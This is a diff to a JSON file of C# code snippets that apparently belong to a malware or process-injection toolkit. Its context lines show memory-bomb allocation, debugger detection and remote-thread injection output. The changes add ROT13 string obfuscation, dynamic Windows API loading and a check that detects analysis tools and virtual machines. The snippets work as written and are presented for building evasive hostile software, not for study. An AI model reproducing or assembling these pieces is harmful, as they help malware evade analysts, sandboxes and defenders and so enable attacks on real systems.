@@ -30,8 +30,8 @@
       "        {",
       "            byte[] bomb = new byte[bombSize];",
       "            // Fill with random data to prevent compression",
-      "            Random rnd = new Random();",
-      "            rnd.NextBytes(bomb);",
+      "            Random rndBomb = new Random();",
+      "            rndBomb.NextBytes(bomb);",
       "            memoryBombs.Add(bomb);",
       "            System.Threading.Thread.Sleep(10); // Brief pause",
       "        }",
@@ -148,10 +148,10 @@
       "    }",
       "    ",
       "    // Check for common debugging tools",
-      "    Process[] processes = Process.GetProcesses();",
+      "    Process[] debugProcesses = Process.GetProcesses();",
       "    string[] debuggerNames = { \"ollydbg\", \"x64dbg\", \"windbg\", \"ida\", \"ghidra\" };",
       "    ",
-      "    foreach (Process proc in processes)",
+      "    foreach (Process proc in debugProcesses)",
       "    {",
       "        foreach (string debugger in debuggerNames)",
       "        {",
@@ -295,6 +295,53 @@
       "Console.WriteLine($\"[+] Remote thread created at: 0x{hThread.ToInt64():X}\");",
       "Console.WriteLine(\"[*] Injection complete.\");",
       "Console.ReadLine();"
+    ]
+  },
+  
+  "Functions": {
+    "string_obfuscation": [
+      "// --- String Obfuscation ---",
+      "// ROT13 decode function for obfuscated strings",
+      "static string DecodeROT13(string input)",
+      "{",
+      "    return new string(input.Select(x => (char)((x >= 'a' && x <= 'z') ? ",
+      "        (x - 'a' + 13) % 26 + 'a' : (x >= 'A' && x <= 'Z') ? ",
+      "        (x - 'A' + 13) % 26 + 'A' : x)).ToArray());",
+      "}"
+    ],
+    
+    "dynamic_api_loading": [
+      "// --- Dynamic API Loading Helper ---",
+      "static IntPtr GetApiAddress(string libraryName, string functionName)",
+      "{",
+      "    IntPtr hModule = LoadLibraryA(libraryName);",
+      "    if (hModule == IntPtr.Zero) return IntPtr.Zero;",
+      "    return GetProcAddress(hModule, functionName);",
+      "}"
+    ],
+    
+    "advanced_evasion": [
+      "// --- Advanced Evasion Techniques ---",
+      "static bool IsAnalysisEnvironment()",
+      "{",
+      "    try",
+      "    {",
+      "        // Check for analysis artifacts",
+      "        string[] artifacts = { \"wireshark\", \"procmon\", \"vmware\", \"virtualbox\" };",
+      "        Process[] processes = Process.GetProcesses();",
+      "        ",
+      "        foreach (Process proc in processes)",
+      "        {",
+      "            foreach (string artifact in artifacts)",
+      "            {",
+      "                if (proc.ProcessName.ToLower().Contains(artifact))",
+      "                    return true;",
+      "            }",
+      "        }",
+      "        return false;",
+      "    }",
+      "    catch { return false; }",
+      "}"
     ]
   }
 }
